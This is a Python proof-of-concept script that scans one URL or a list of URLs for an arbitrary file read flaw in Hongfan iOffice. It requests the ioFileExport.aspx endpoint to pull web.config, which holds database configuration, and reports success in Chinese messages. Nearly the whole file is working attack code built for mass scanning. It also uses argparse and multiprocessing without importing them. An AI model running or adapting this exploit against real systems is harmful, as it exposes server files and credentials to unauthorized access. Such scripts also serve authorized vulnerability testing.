import time

import requests
import urllib3


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(url):
    target_url1 = url + "ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream"
    target_url2 = url + "ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    print(now_time() + " [INFO]     正在检测红帆任意文件读取漏洞")
    try:
        urllib3.disable_warnings()
        res1 = requests.get(url=target_url1, headers=headers, verify=False, timeout=10)
        res2 = requests.get(url=target_url2, headers=headers, verify=False, timeout=10)
        if res1.status_code == 200 and "DbConfig" in res1.text:
            print(now_time() + " [SUCCESS]     存在红帆任意文件读取:{}".format(target_url1))
        if res2.status_code == 200:
            print(now_time() + " [SUCCESS]     存在红帆任意文件读取:{}".format(target_url2))
        else:
            print(now_time() + " [WARNING]  不存在红帆任意文件读取")
    except Exception as e:
        print(now_time() + " [ERROR]    目标请求失败 ")


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        print('\nCTRL+C 退出')
